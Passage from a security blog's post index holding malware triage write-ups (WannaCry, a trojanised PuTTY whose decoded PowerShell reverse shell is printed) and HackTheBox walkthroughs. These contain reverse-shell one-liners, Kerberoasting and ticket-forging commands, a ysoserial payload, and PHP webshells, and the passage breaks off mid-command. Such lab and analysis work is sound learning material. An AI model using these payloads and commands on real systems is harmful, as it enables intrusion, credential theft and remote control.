rep movsd dword es:[edi], dword ptr [esi]0x00408157 movsb byte es:[edi], byte ptr [esi]0x00408158 mov dword [var_41h], eax0x0040815c mov dword [var_45h], eax0x00408160 mov dword [var_49h], eax0x00408164 mov dword [var_4dh], eax0x00408168 mov dword [var_51h], eax0x0040816c mov word [var_55h], ax0x00408171 push eax0x00408172 push eax0x00408173 push eax0x00408174 push 1 ; 10x00408176 push eax0x00408177 mov byte [var_6bh], al0x0040817b call dword [InternetOpenA] ; 0x40a1340x00408181 push 00x00408183 push 0x840000000x00408188 push 00x0040818a lea ecx, [var_14h]0x0040818e mov esi, eax0x00408190 push 00x00408192 push ecx0x00408193 push esi0x00408194 call dword [InternetOpenUrlA] ; 0x40a1380x0040819a mov edi, eax0x0040819c push esi0x0040819d mov esi, dword [InternetCloseHandle] ; 0x40a13c0x004081a3 test edi, edi0x004081a5 jne 0x4081bc0x004081a7 call esi0x004081a9 push 00x004081ab call esi0x004081ad call fcn.004080900x004081b2 pop edi0x004081b3 xor eax, eax0x004081b5 pop esi0x004081b6 add esp, 0x500x004081b9 ret 0x100x004081bc call esi0x004081be push edi0x004081bf call esi0x004081c1 pop edi0x004081c2 xor eax, eax0x004081c4 pop esi0x004081c5 add esp, 0x500x004081c8 ret 0x10We can even see here the URL we found with floss and the functions from the Address Table of URL handling. The decompiler guess this code:/* jsdec pseudo code output *//* C:\\Users\\zeropio\\Desktop\\Ransomware.wannacry.exe.malz @ 0x40816c */#include &lt;stdint.h&gt; int32_t main (void) { int32_t var_14h; int32_t var_8h; int32_t var_41h; int32_t var_45h; int32_t var_49h; int32_t var_4dh; int32_t var_51h; int32_t var_55h; int32_t var_6bh; ecx = 0xe; esi = \"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\"; edi = &amp;var_8h; eax = 0; do { *(es:edi) = *(esi); ecx--; esi += 4; es:edi += 4; } while (ecx != 0); *(es:edi) = *(esi); esi++; es:edi++; eax = InternetOpenA (eax, 1, eax, eax, eax, eax, eax, eax, ax, al); ecx = &amp;var_14h; esi = eax; eax = uint32_t (*InternetOpenUrlA)(void, void, void, void, void, void) (esi, ecx, 0, 0, 0x84000000, 0); edi = eax; esi = *(InternetCloseHandle); if (edi == 0) { void (*esi)() (); void (*esi)(void) (0); eax = fcn_00408090 (); eax = 0; return eax; } void (*esi)() (); eax = void (*esi)(void) (edi); eax = 0; return eax;}It is opening an URL. If the URL doesn’t work the program close it.DynamicWe will start by detonating the malware with administrator privileges. From this view:The first detonation, with inetsim enabled will not do anything. But with that turned off, we will have this:Network IndicatorsEven though we don’t have internet connection to make this malware works, we can start wireshark with this malware executing. Once we launched it this lines appear:Soon, our computer start searching other computers on the network:In the other hand, TCPview show this once the program has started:We can see it trying connection with some IPs in the port 445 (SMB). If we wait a while, we can see a .exe program has appear:Host IndicatorsAs we don’t need internet (or at least inetsim) to run this malware, we will try to find the host indicators. We have seen a bunch of different files during the basic phase, let’s try finding them now.We will use procmon filtering by the malware file name. This will print a bunch of information once it is launched. We can found the name of one of the files in the floss . This file was created under C:\\Windows at the moment of the detonation.We can see in procmon that this binary has been from wannacry:We filter now by the PID (in this case 5796) and the Operation CreateFile. We will see a new process started. We can see the creation of weird files:There we have many files we have found as strings in the binary:Also, a process for persistence is created with the same folder name:ReviewWe can assure that this binary is a malware, specifically a ransomware. Wannacry encrypt all the user files, add persistence to the target and search in the network for other computers with SMB, to infect them.This malware doesn’t work with internet connection." }, { "title": "Triage | SillyPutty", "url": "/malware/triage/sillyputty", "categories": "Malware, Triage", "tags": "malware, windows", "date": "2022-09-06 00:00:00 +0200", "snippet": " Name Sample Link Personal Rating * MD5 Hash WannaCry GitHub PMAT Husky 3.0 334a10500feb0f3444bf2e86ab2e76da *This rating is take from the moment I did this analysis. In the time being, this can change because my skills have progressed. Only take it as a point of view of this moment.Static AnalysisWe start with a Putty binary. At first glance it seems like a normal executable.HashesFirst, we get the hashes:C:\\Users\\zeropio\\Desktopλ sha256sum.exe putty.exe0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 *putty.exeC:\\Users\\zeropio\\Desktopλ md5sum.exe putty.exe334a10500feb0f3444bf2e86ab2e76da *putty.exeVirusTotal already told us is a malicious file. We can guess it is a trojan as it seems to be a malicious copy of putty.ArchitectureWe see the architecture:C:\\Users\\zeropio\\Desktopλ file putty.exeputty.exe: PE32 executable (GUI) Intel 80386, for MS WindowsStringsNow with this command we will get the strings from the binary:C:\\Users\\zeropio\\Desktopλ FLOSS.exe putty.exe &gt; floss.txtFrom the strings we see many references to putty or putty servers. We can see that these malware comes from a malicious version of putty, it is not just a malware. Most of the strings seems to be part of putty, like SSH connections. We can see some weird ones like:Unable to create registry keyHKEY_CURRENT_USER\\%s\\%sUnable to create registry keyHKEY_CURRENT_USER\\%sPEviewWe will use now PEviewfor further analysis. We got that this was compile on 2021/07/10:We will get the virtual and raw data size: Type Hex Value Decimal Value Virtual 95F6D 614,253 Raw Data 96000 614,400 We can see that the difference is minimum, so it is not a packed malware. Also, we don’t see any UPX0.In the Address Table we can see a bunch of functions imported.Dynamic AnalysisFirst DetonationExecuting the binary without Internet connection will pop up a PowerShell a few seconds after closing it. Then, putty will appear as normal. With internet connection the behavior is the same.If we filter the Path contains powershell we can find a Process Create operation. If we inspect it we can see a base64:This is the string:powershell.exe -nop -w hidden -noni -ep bypass \"&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\"We can use CyberChef to decoded it. We see that after the base64 encoding it has a Gunzip encodig. Now we have a PowerShell file:# Powerfun - Written by Ben Turner &amp; Dave Hardyfunction Get-Webclient { $wc = New-Object -TypeName Net.WebClient $wc.UseDefaultCredentials = $true $wc.Proxy.Credentials = $wc.Credentials $wc}function powerfun { Param( [String]$Command, [String]$Sslcon, [String]$Download ) Process { $modules = @() if ($Command -eq \"bind\") { $listener = [System.Net.Sockets.TcpListener]8443 $listener.start() $client = $listener.AcceptTcpClient() } if ($Command -eq \"reverse\") { $client = New-Object System.Net.Sockets.TCPClient(\"bonus2.corporatebonusapplication.local\",8443) } $stream = $client.GetStream() if ($Sslcon -eq \"true\") { $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])) $sslStream.AuthenticateAsClient(\"bonus2.corporatebonusapplication.local\") $stream = $sslStream } [byte[]]$bytes = 0..20000|%{0} $sendbytes = ([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \" + $env:username + \" on \" + $env:computername + \"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\") $stream.Write($sendbytes,0,$sendbytes.Length) if ($Download -eq \"true\") { $sendbytes = ([text.encoding]::ASCII).GetBytes(\"[+] Loading modules.`n\") $stream.Write($sendbytes,0,$sendbytes.Length) ForEach ($module in $modules) { (Get-Webclient).DownloadString($module)|Invoke-Expression } } $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;') $stream.Write($sendbytes,0,$sendbytes.Length) while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding $data = $EncodedText.GetString($bytes,0, $i) $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String ) $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '&gt; ' $x = ($error[0] | Out-String) $error.clear() $sendback2 = $sendback2 + $x $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) $stream.Flush() } $client.Close() $listener.Stop() }}powerfun -Command reverse -Sslcon trueWe can see that it is enabling a reverse shell. In this line we can see the DNS server it is calling and the port:$client = New-Object System.Net.Sockets.TCPClient(\"bonus2.corporatebonusapplication.local\",8443) DNS bonus2.corporatebonusapplication.local Port 8443 Add to the hosts file:\t127.0.0.1\t bonus2.corporatebonusapplication.localNow open a netcat in the Windows host:C:\\Users\\zeropio\\Desktopλ nc -lvnp 8443Execute the malware and we will get an error. This is because we don’t have a certificate for the TLS.We can assure that this is a malicious file. Even though we couldn’t get the malicious file to work (the reverse shell failed because of the certificates), we have the source code that make a clear connection." }, { "title": "HTB | Scrambled", "url": "/pentesting/htb/machines/scrambled", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, medium, machines", "date": "2022-09-01 00:00:00 +0200", "snippet": "FingerprintThe nmap show us that:Nmap scan report for 10.10.11.168Host is up (0.071s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: Scramble Corp Intranet88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-31 22:13:53Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-31T22:15:15+00:00; +2s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:571433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2022-08-31T04:39:38|_Not valid after: 2052-08-31T04:39:383268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)|_ssl-date: 2022-08-31T22:15:14+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=DC1.scrm.local| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local| Not valid before: 2022-06-09T15:30:57|_Not valid after: 2023-06-09T15:30:57Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: mean: 1s, deviation: 0s, median: 0s| ms-sql-info: | 10.10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM| number: 15.00.2000.00| Product: Microsoft SQL Server 2019| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| smb2-time: | date: 2022-08-31T22:14:38|_ start_date: N/ARemember to add the following lines in the hosts to make it work:10.10.11.168 scrm.local10.10.11.168 DC1.scrm.localFootholdWe see an kerberos open, we can start enumerating users with this wordlist and kerbrute:zero@pio$ \t &gt; [+] VALID USERNAME: ASMITH@scrm.local\t &gt; [+] VALID USERNAME: KSIMPSON@scrm.local\t &gt; [+] VALID USERNAME: SJENKINS@scrm.local\t &gt; [+] VALID USERNAME: JHALL@scrm.local\t &gt; [+] VALID USERNAME: KHICKS@scrm.localIf we do a password spray with each user we found a valid login:zero@pio$ kerbrute passwordspray -d scrm.local --dc DC1.scrm.local finding/valid_users ksimpson\t&gt; [+] VALID LOGIN: KSIMPSON@scrm.local:ksimpsonWe can try requesting a TGT ticket:zero@pio$ impacket-getTGT scrm.local/ksimpson:ksimpsonzero@pio$ export KRB5CCNAME=ksimpson.ccacheFor the next step we will need to made some adjustment in the scripts, as explained here.zero@pio$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass\t$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$eee76754ccb373aee4f1863840cb6caa$c1e3b23d1cddf8ba5c744d131990c90ca2552eb7075ecdd6e85f77942055e678fc106480c3a5e8fb526ca7927a961bda6be52dfc5eb4874fbdea74697e670369fc1de2a9bfb7bee032c3d1e5c916633e6a5a105df8a97c4f0ca64a86cb3a5f53cff325f0a5ca5e51a361e82c1ec62ec5610a2c4dc6c0dd0f6b6a2146276b9437a1d6edd9addeed0cb7a5e281a057731cfba7d88406fa02a5954bed196e5be5682bed65b58a95114b0a0d2a788e9966d10f252e491792744ab3cf6b97595fb2a87141b911a15104f1626cf526b020a0c3d005f4bf3c2ac3827cfcff318f55d5acd1be35e26d9e145e07a719adcd56254aaa0abdc5cd4fe0a4b9a91cb7f74e4b1e813e1f97c8708bbb4ecde2116e57b1d19310dc9bce6b6c419eb8ba3024c404d18c757f757e309936e183a63e0ead072a3e7a6f8497d2b871b9235eb471aacbe959f4fcb1e982ebae3af50edefcb6f61a1e0d3cf18a0cdfbf286186f11207dafb4a8cbe1ac8eb331ff516b4c0cd449dc2772bc8a127e5689bc617ef6ba8bc4ba456f03a8ca1c3c8044e1e4e353500338aefef54f9e63548e70aae38b9fb9f9b17e53fb3f4f8f065d4e54456b5daa83eda4579c82a89cab473e109c91a9580f39b316854e386353eea6b8cace97234073284c3052a08223e0d894b5934df79bd64942b35221fde6a353fdd39ae1cfb6cc4fd75e5312e946d37057754b3f0db6de14b94b3841751b61b0ff6ca9d9724ad7ae42a75838665299d5e512967156d29e8dc54397d1a72c591584e10f590885d98a4c1c312408a2ee9e445069cd26c0a3b19b476b303795826be1f76a1f928b2226824f68b65d5874dfeb40b60ca53263cb96e471839a467d1c279f58afad62773151c0d07940beaeb43acf73f1547e745f18794bf6e74706d7388db39cca42b157d0b13693c723e8d5fe49aac9d04363036e0bb6a4dc0a4bab67b207e1dc6d3cd7d3aacbeee2b11d06078fd6a5efd09557bae517bc92ed9657817c7e1f917c9174b28d84abbefa1f10a651a91b50c563b6913c5c1b447af1a80a8a44b9749916c10189395817afd61698ae2509c3e403dd73240bedabca9bda9c7b15745cb13600937b99728f13f84f2d46dd064bb7f830387cca879f3e10362a2cbe67689186054f83bd05a9366cfc75207c63935027e930d09807a6a0015c1cef08fa5b9ab39df8843db4e21f9020a9972fd3832a493a6bd6c1e8b3629f319bc83ca322269b245f496541cfafeedac06f25701b00204d7077a47b3af536d7e8484292796e8f6b69aded74c2dc34a92292462b04c657da6a171f1c2f0af07f3622eeb8d4aa517d1ddf7b1f4bc0bee3fab2c81728d0e36498802d4097fd6eb1361bb5c77c6ae8eb2e08d2e88cf6b2b792eb69172345484d9ea5fe26c50e3e0588c97e4272528f96691077cafcaa59fa5ab47We can crack it now with hashcat:zero@pio$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt\t...cafcaa59fa5ab47:Pegasus60\tSession..........: hashcat\tStatus...........: CrackedConvert the password to a ntlm format and get the domain SID:zero@pio$ impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug\t[+] Trying to connect to KDC at SCRM.LOCAL\t[+] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500Now request a ticket:zero@pio$ impacket-ticketer -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200zero@pio$ export KRB5CCNAME=Administrator.ccacheNow we can authenticate as mssqclient:zero@pio$ impacket-mssqlclient dc1.scrm.local -k -no-passWe found a pair of credentials there:SQL&gt; use ScrambleHR\t[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR\t[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.SQL&gt; select * from UserImport\tLdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups \t\t-------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- ------------- \t\tMiscSvc ScrambledEggs9900 scrm.localWe can even execute commands:SQL&gt; enable_xp_cmdshellSQL&gt; xp_cmdshell whoami\tscrm\\sqlsvcCreate a reverse shell:SQL&gt; xp_cmdshell curl 10.10.16.44/nc.exe -o C:\\Temp\\nc.exeSQL&gt; xp_cmdshell C:\\Temp\\nc.exe -e powershell 10.10.16.44 443zero@pio$ nc -lvnp 443 \tlistening on [any] 443 ...\tconnect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65303\tWindows PowerShell \tCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32&gt; whoami\twhoamiscrm\\sqlsvcPrivilege EscalationWe can use the previous founded credentials to execute commands:PS C:\\Windows\\system32&gt; $SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -ForcePS C:\\Windows\\system32&gt; $Cred = New-Object System.Management.Automation.PSCredential('Scrm\\MiscSvc', $SecPassword)PS C:\\Windows\\system32&gt; Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }\tscrm\\miscsvcSend a new reverse shell:PS C:\\Windows\\system32&gt; Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\\Temp\\nc.exe -e powershell 10.10.16.44 4443 }zero@pio$ nc -lvnp 4443 \tlistening on [any] 4443 ...\tconnect to [10.10.16.44] from (UNKNOWN) [10.10.11.168] 65316\tWindows PowerShell \tCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\miscsvc\\Documents&gt; whoami\tscrm\\miscsvcWe found a program running in the 4411 port:PS C:\\Shares\\IT\\Apps\\Sales Order Client&gt; dir\t\t Directory: C:\\Shares\\IT\\Apps\\Sales Order Client\t\t\tMode LastWriteTime Length Name \t---- ------------- ------ ---- \t-a---- 05/11/2021 20:52 86528 ScrambleClient.exe \t-a---- 05/11/2021 20:52 19456 ScrambleLib.dllWe can use ysoserial to generate a reverse shell in a Windows host:C:\\scripts&gt; .\\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \"C:\\Temp\\nc.exe -e powershell 10.10.16.44 9000\"\tAAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA+AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBM0FVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1NdVpYaGxJQzFsSUhCdmQyVnljMmhsYkd3Z01UQXVNVEF1TVRZdU5EUWdPVEF3TUNJZ1UzUmhibVJoY21SRmNuSnZja1Z1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVTNSaGJtUmhjbVJQZFhSd2RYUkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRlZ6WlhKT1lXMWxQU0lpSUZCaGMzTjNiM0prUFNKN2VEcE9kV3hzZlNJZ1JHOXRZV2x1UFNJaUlFeHZZV1JWYzJWeVVISnZabWxzWlQwaVJtRnNjMlVpSUVacGJHVk9ZVzFsUFNKamJXUWlJQzgrRFFvZ0lDQWdJQ0E4TDNOa09sQnliMk5sYzNNdVUzUmhjblJKYm1adlBnMEtJQ0FnSUR3dmMyUTZVSEp2WTJWemN6NE5DaUFnUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNEwLCopy the output and open a netcat to the machine in that port. Add UPLOAD_ORDER; and then our payload:zero@pio$ netcat 10.10.11.168 4411\tSCRAMBLECORP_ORDERS_V1.0.3;\tUPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2V....And then we should receive a connection in our netcat." }, { "title": "HTB | Carpediem", "url": "/pentesting/htb/machines/carpediem", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, hard, machines", "date": "2022-09-01 00:00:00 +0200", "snippet": "FingerprintThe nmap gives us:Nmap scan report for 10.10.11.167Host is up (0.12s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)| 256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)|_ 256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Comming Soon|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can fuzz for vhosts:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://carpediem.htb/' -H 'Host: FUZZ.carpediem.htb' -fs 2875\tportal [Status: 200, Size: 31090, Words: 7687, Lines: 463, Duration: 101ms]We have a login there and a register account option. Created and account and login as it.FootholdIn the mangament account part we can see an ID in the headers:The login_type=2, if we changed it to 1 and forward the request we will be modifying the admin account. We have access now to the admin panel:Moving through the page we can modify the account once again, this time adding a profile image. We can try uploading a reverse shell with the following content:zero@pio$ exiftool -Comment='&lt;?php echo \"&lt;pre&gt;\"; system($_GET[\"cmd\"]); ?&gt;' dog.jpegChange the name in burp before sending, and now we have RCE:We will use a url encoded of a base64 shell to execute a reverse shell:echo%20%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjQ0LzQ0MyAwPiYx%22%20%7C%20base64%20%2Dd%20%7C%20bashWe now get access to the system, but we noticed we are in a container.www-data@3c371615b7aa:/var/www/html/portal/uploads$ hostname\t3c371615b7aawww-data@3c371615b7aa:/var/www/html/portal/uploads$ whoami\twww-dataPrivilege EscalationWe have access of a MongoDB from the container. With chisel we can make a connection:zero@pio$ chisel server --reverse --port 8000www-data@3c371615b7aa:/dev/shm$ ./chisel client 10.10.16.44:8000 R:8118:172.17.0.5:8118 R:27017:172.17.0.3:27017 &amp;We can see that is a trudesk. Use a bcrypt password and update the password.zero@pio$ mongosh mongodb://127.0.0.1:27017test&gt; show databases\tadmin 135 kB\tconfig 111 kB\tlocal 90.1 kB\ttrudesk 1.12 MBtest&gt; use trudesktrudesk&gt; db.accounts.update( {\"_id\": ObjectId(\"623c8b20855cc5001a8ba13c\")}, {$set: {\"password\": \"$2b$10$zX4LTPwe7bEjhvQ.lbNgNuttsUcvcstL6SHHhZhIXouFObHXxYqey\"}});We can login with the admin:password credentials. We see some tickets, from there we got the credentials 9560:2022. They ask to call to 62. After making the call in the web we can listen to the new credentials: hflaccus:AuRj4pxq9qPk. With SSH we can use them.LinPEAS told us we can intercept traffic, so we start a tcpdump.hflaccus@carpediem:~$ tcpdump -i any port 443 -w traffic_outputGet also the ssl key in /etc/ssl/certs/backdrop.carpediem.htb.key. Checking the outpuf file in Wireshark we can find the following credentials: jpardella:tGPN6AmJDZwYWdhY.Open a port forwading:zero@pio$ sshpass -p AuRj4pxq9qPk ssh hflaccus@10.10.11.167 -L 8002:127.0.0.1:8002We can see a login in https://127.0.0.1:8002. We found a login, the previous credentials will work there.It is using the Backdrop CMS, we found a vulnerability in this Github. Modify the script to make a reverse shell instead of a webshell:zero@pio$ tar -xf reference.tarzero@pio$ cat reference/shell.php\t&lt;?php system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1'\");?&gt;zero@pio$ tar -cvf reference.tar reference &amp;&gt;/dev/nullImport the new “module” in the Functionality page, through a manual installation. Now open a netcat and call the module in https://localhost:8002/modules/reference/shell.php.www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ whoami\twww-datawww-data@90c7f522b842:/var/www/html/backdrop/modules/reference$ hostname -i\t172.17.0.2We are in a new container. We found the following script:www-data@90c7f522b842:/opt$ cat heartbeat.sh\t#!/bin/bash\t#Run a site availability check every 10 seconds via cron\tchecksum=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))\tif [[ $checksum != \"70a121c0202a33567101e2330c069b34\" ]]; then\t exit\tfi\tstatus=$(php /var/www/html/backdrop/core/scripts/backdrop.sh --root /var/www/html/backdrop https://localhost)\tgrep \"Welcome to backdrop.carpediem.htb!\" \"$status\"\tif [[ \"$?\" != 0 ]]; then\t #something went wrong. restoring from backup.\t cp /root/index.php /var/www/html/backdrop/index.php\tfiWe can change the index.php in a reverse shell:zero@pio$ cat index.php \t&lt;?php system(\"bash -c 